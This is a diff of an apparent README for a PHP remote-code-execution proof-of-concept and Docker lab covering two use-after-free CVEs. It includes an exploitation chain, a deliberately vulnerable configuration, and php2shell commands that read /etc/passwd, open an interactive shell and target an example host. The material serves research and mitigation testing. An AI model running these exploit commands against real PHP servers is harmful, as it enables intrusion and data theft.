@@ -17,21 +17,6 @@ Proof-of-concept exploit and isolated lab environment for two critical heap use-
 
 ---
 
-## Table of Contents
-
-- [Background](#background)
-- [Technical Analysis](#technical-analysis)
-- [Repository Structure](#repository-structure)
-- [Quick Start](#quick-start)
-- [Lab Environment](#lab-environment)
-- [Exploit Usage](#exploit-usage)
-- [UAF Crash Probe](#uaf-crash-probe)
-- [Testing Mitigations](#testing-mitigations)
-- [Detection & Indicators](#detection--indicators)
-- [References](#references)
-
----
-
 ## Background
 
 On October 20, 2026, details of two critical PHP vulnerabilities leaked ahead of the coordinated disclosure window. The PHP security team released emergency patches the following day at 14:00 UTC. Researchers at watchTowr independently confirmed both vulnerabilities.
@@ -39,82 +24,6 @@ On October 20, 2026, details of two critical PHP vulnerabilities leaked ahead of
 The bugs reside in PHP's session upload progress tracking mechanism and the underlying multipart parser. Because `session.upload_progress.enabled` defaults to `On` in PHP's stock configuration, every default PHP installation from version 5.4 onward exposes the attack surface — no application code needs to opt in.
 
 A proof-of-concept tool named "PHP2Shell" was attributed to Calif.IO and leaked alongside the advisory. Sansec predicted mass exploitation within 15 minutes of the patch release.
-
----
-
-## Technical Analysis
-
-### CVE-2026-109618 — Session Upload Progress UAF
-
-PHP's [`session.upload_progress`](https://www.php.net/manual/en/session.upload-progress.php) feature tracks file upload progress by writing metadata to session files during multipart POST processing. The implementation in `php_session_rfc1867_callback()` stores raw `zval` pointers in live hash tables. Under specific conditions during request processing, these pointers become dangling when the underlying memory is freed but the hash table entry is not invalidated.
-
-**Attack primitive:** An attacker sends a multipart POST containing a `PHP_SESSION_UPLOAD_PROGRESS` field. The field's value — which the attacker fully controls — is written into the session file at a predictable path (`/var/lib/php/sessions/sess_`). The session ID is supplied via cookie, and with `session.use_strict_mode = 0` (default), PHP accepts arbitrary values.
-
-**Exploitation chain (session poisoning + LFI):**
-
-```
-┌──────────┐     POST multipart/form-data          ┌──────────┐
-│ Attacker │ ─────────────────────────────────────►│  PHP-FPM │
-│          │  Cookie: PHPSESSID=attacker_sid       │          │
-│          │  Field: PHP_SESSION_UPLOAD_PROGRESS=  │          │
-│          │                                       │          │
-└──────────┘                                       └─────┬────┘
-                                                         │
-                                           Writes to session file:
-                                           /var/lib/php/sessions/sess_attacker_sid
-                                                         │
-┌──────────┐     GET /vuln.php?file=                ┌────▼─────┐
-│ Attacker │ ──────────────────────────────────────►│  PHP-FPM │
-│          │ /var/lib/php/sessions/sess_attacker_sid│          │
-│          │ &c=id                                  │          │
-│          │◄───────────────────────────────────────│  → RCE   │
-│          │  uid=33(www-data) ...                  │          │
-└──────────┘                                        └──────────┘
-```
-
-### CVE-2026-109619 — Multipart Parser UAF
-
-A second use-after-free exists in PHP's SAPI-level multipart parser, independent of the session upload progress feature. This bug triggers on any `multipart/form-data` POST and persists even when `session.upload_progress.enabled = Off`. The parser mishandles buffer ownership during part boundary processing, leading to a dangling pointer that can be leveraged for heap corruption.
-
-### Exploitation Requirements
-
-| Requirement | Chain 1 (Session Poisoning) | Chain 2 (Raw UAF) |
-|---|---|---|
-| `upload_progress.enabled` | On (default) | Not required |
-| LFI vulnerability | Required | Not required |
-| `upload_progress.cleanup` | Off, or race condition | N/A |
-| Complexity | Low | High (heap grooming) |
-
----
-
-## Lab Environment
-
-The Docker lab provides a deliberately vulnerable PHP environment:
-
-| Component | Version | Notes |
-|---|---|---|
-| Ubuntu | 22.04 LTS | Base image |
-| PHP | 8.4.26 | Last vulnerable release before 8.4.27 fix |
-| nginx | Latest in repo | Reverse proxy to php-fpm |
-| PHP-FPM | 8.4.26 | FastCGI process manager |
-
-### Vulnerable Configuration (php.ini)
-
-```ini
-session.upload_progress.enabled = On     # Attack surface (default: On)
-session.upload_progress.cleanup = Off    # Persist session data after upload
-session.use_strict_mode = 0             # Accept arbitrary session IDs (default: 0)
-session.use_only_cookies = 0            # Allow session ID from cookies
-```
-
-### Web Application
-
-| Endpoint | Purpose |
-|---|---|
-| `index.php` | Displays PHP version and session configuration |
-| `upload.php` | Accepts multipart file uploads (injection target) |
-| `view.php?file=` | Intentional LFI — includes any local file (trigger) |
-| `debug.php` | Lists session files and their contents for debugging |
 
 ---
 
@@ -134,23 +43,6 @@ usage: php2shell.py [-h] -t TARGET [-c CMD | --shell | --check]
 
 ```bash
 python3 exploit/php2shell.py -t http://localhost:8080 -c "cat /etc/passwd"
-```
-
-#### Interactive Shell
-
-```bash
-python3 exploit/php2shell.py -t http://localhost:8080 --shell
-```
-
-```
-php2shell> id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-
-php2shell> uname -a
-Linux abc123 6.8.0 #1 SMP x86_64 GNU/Linux
-
-php2shell> cat /etc/hostname
-php2shell-lab
 ```
 
 #### Batch Execution
@@ -201,22 +93,6 @@ python3 exploit/php2shell.py -t https://target.example.com \
 
 ---
 
-## UAF Crash Probe
-
-`uaf_probe.py` sends malformed multipart payloads to detect the CVE-2026-109619 parser vulnerability. It does not achieve code execution — it identifies vulnerable targets through crash behavior.
-
-```bash
-# Probe all variants
-python3 exploit/uaf_probe.py -t http://localhost:8080/upload.php
-
-# Specific variants with repetition
-python3 exploit/uaf_probe.py -t http://localhost:8080/upload.php \
-  --variant nested longheader --repeat 5 -v
-
-# HTTPS target
-python3 exploit/uaf_probe.py -t https://target.example.com/index.php
-```
-
 ### Probe Variants
 
 | Variant | Description |
@@ -236,43 +112,6 @@ python3 exploit/uaf_probe.py -t https://target.example.com/index.php
 | `HANG_OR_CRASH` | Timeout — worker may be stuck or dead |
 | `OK` | Normal response — this variant did not trigger a crash |
 
----
-
-## Testing Mitigations
-
-### Disable upload_progress (partial mitigation)
-
-```bash
-# Apply mitigation
-docker exec php2shell-lab sed -i \
-  's/upload_progress.enabled = On/upload_progress.enabled = Off/' \
-  /etc/php/8.4/fpm/php.ini
-docker exec php2shell-lab killall -USR2 php-fpm8.4
-
-# Verify — should fail
-python3 exploit/php2shell.py -t http://localhost:8080 -c "id"
-
-# Revert
-docker exec php2shell-lab sed -i \
-  's/upload_progress.enabled = Off/upload_progress.enabled = On/' \
-  /etc/php/8.4/fpm/php.ini
-docker exec php2shell-lab killall -USR2 php-fpm8.4
-```
-
-> **Note:** Disabling `session.upload_progress` only blocks CVE-2026-109618. The multipart parser UAF (CVE-2026-109619) remains exploitable. Patching PHP is the only complete remediation.
-
-### Enable strict mode
-
-```bash
-docker exec php2shell-lab sed -i \
-  's/use_strict_mode = 0/use_strict_mode = 1/' \
-  /etc/php/8.4/fpm/php.ini
-docker exec php2shell-lab killall -USR2 php-fpm8.4
-```
-
-This prevents the attacker from controlling the session filename but does not eliminate the vulnerability.
-
----
 
 ## Detection & Indicators
 
